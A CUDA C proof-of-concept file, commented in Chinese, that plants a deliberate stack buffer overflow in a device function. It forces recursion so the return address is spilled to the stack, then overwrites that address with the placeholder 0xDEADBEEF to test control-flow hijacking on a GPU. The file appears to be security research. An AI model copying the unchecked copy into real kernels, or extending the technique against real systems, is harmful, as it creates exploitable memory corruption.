#include <stdio.h>
#include <cuda_runtime.h>

// 修改 1: 增加 depth 参数用于控制递归
__device__ void vulnerable_function(int* input_data, int size, int depth) {
    // 这里的数组稍微大一点，增加栈的压力
    int local_buffer[16]; 
    
    // 给 buffer 填点初始值，方便在内存中定位
    local_buffer[0] = 0xAAAAAAAA;
    
    // 溢出漏洞逻辑
    for (int i = 0; i < size; ++i) {
         // 注意：这里去掉了边界检查，允许溢出
         local_buffer[i] = input_data[i];
    }

    // 修改 2: 引入递归调用
    // 只要 depth > 0，就调用自己。
    // 这会强制编译器把当前的返回地址 (R20) 保存到栈上 (STL R20, [R1+...])
    // 这样在递归返回时，它必须从栈上读取地址 (LDL R20, [R1+...])
    if (depth > 0) {
        vulnerable_function(input_data, size, depth - 1);
    }
}

__global__ void exploit_kernel(int* input_data, int size) {
    // 启动时给 depth 传 1，让它至少递归一次
    vulnerable_function(input_data, size, 1);
}

int main() {
    int* d_data;
    cudaMalloc(&d_data, 1024 * sizeof(int));
    
    int h_data[128];
    // 1. 填充背景数据 (Padding)
    for(int i=0; i<128; i++) h_data[i] = 0x11111111;

    // 2. 【攻击核心】覆盖返回地址
    // 根据计算，偏移量是 21 (84字节 / 4)
    // R20 (低32位)
    h_data[21] = 0xDEADBEEF; 
    // R21 (高32位，通常是 0 或者显存的高位地址，这里设为 0 测试)
    h_data[22] = 0x00000000;

    // 3. 拷贝数据
    cudaMemcpy(d_data, h_data, 128 * sizeof(int), cudaMemcpyHostToDevice);

    printf("Launching exploit kernel...\n");

    // 4. 触发漏洞
    // 这里的 size 设为 30，足以覆盖到第 21、22 个位置
    // depth 设为 1 确保触发递归，强制从栈恢复地址
    exploit_kernel<<<1, 1>>>(d_data, 30);

    cudaDeviceSynchronize();
    
    // 5. 检查错误
    cudaError_t err = cudaGetLastError();
    if (err != cudaSuccess) {
        printf("SUCCESS? Captured CUDA Error: %s\n", cudaGetErrorString(err));
    } else {
        printf("Kernel finished normally (Attack Failed?)\n");
    }

    cudaFree(d_data);
    return 0;
}